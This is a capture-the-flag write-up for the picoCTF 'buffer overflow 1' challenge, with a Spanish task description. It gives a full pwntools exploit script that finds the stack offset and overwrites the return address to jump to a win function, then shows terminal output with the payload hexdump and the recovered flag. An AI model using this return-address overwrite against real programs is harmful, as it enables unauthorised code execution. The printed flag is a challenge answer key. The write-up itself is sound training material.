## Descripción
Control the return addressNow we're cooking! You can overflow the buffer and return to the flag function in the [program](https://artifacts.picoctf.net/c/252/vuln).You can view source [here](https://artifacts.picoctf.net/c/252/vuln.c). And connect with it using `nc saturn.picoctf.net 60079`

## Solución

``` python
import re
from pwn import *

exe = context.binary = ELF('vuln')

host = 'saturn.picoctf.net'
port = int(60079)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
tbreak main
continue
'''.format(**locals())

def send_payload(proc, payload):
    proc.sendlineafter(b"Please enter your string: ", payload)

proc = process(exe.path)

payload = cyclic(100, n=exe.bytes)
send_payload(proc, payload)
proc.wait()
overflow_offset = cyclic_find(proc.corefile.fault_addr, n=exe.bytes)
log.info("Overflow offset: %i", overflow_offset)

io = start()
payload = fit({overflow_offset: exe.symbols["win"]})
log.info("Sending payload: \n{}".format(hexdump(payload)))

send_payload(io, payload)

output = io.recvuntil(b"}")

flag = re.search("picoCTF{.*?}", output.decode("ascii")).group()
log.success("Flag %s", flag)
```
``` python
┌─[✗]─[dantefx@dantefx-Inspiron5481]─[~/Descargas]
└──╼ $chmod +x vuln
┌─[dantefx@dantefx-Inspiron5481]─[~/Descargas]
└──╼ $python3 bufferover1.py 
[*] '/home/dantefx/Descargas/vuln'
    Arch:     i386-32-little
    RELRO:    Partial RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
    RWX:      Has RWX segments
[+] Starting local process '/home/dantefx/Descargas/vuln': pid 3337
[*] Process '/home/dantefx/Descargas/vuln' stopped with exit code -11 (SIGSEGV) (pid 3337)
[+] Parsing corefile...: Done
[*] '/home/dantefx/Descargas/core.3337'
    Arch:      i386-32-little
    EIP:       0x6161616c
    ESP:       0xfffe2080
    Exe:       '/home/dantefx/Descargas/vuln' (0x8048000)
    Fault:     0x6161616c
[*] Overflow offset: 44
[+] Opening connection to saturn.picoctf.net on port 60079: Done
[*] Sending payload: 
    00000000  61 61 61 61  62 61 61 61  63 61 61 61  64 61 61 61  │aaaa│baaa│caaa│daaa│
    00000010  65 61 61 61  66 61 61 61  67 61 61 61  68 61 61 61  │eaaa│faaa│gaaa│haaa│
    00000020  69 61 61 61  6a 61 61 61  6b 61 61 61  f6 91 04 08  │iaaa│jaaa│kaaa│····│
    00000030
[+] Flag picoCTF{addr3ss3s_ar3_3asy_c76b273b}
[*] Closed connection to saturn.picoctf.net port 60079
```
picoCTF{addr3ss3s_ar3_3asy_c76b273b}
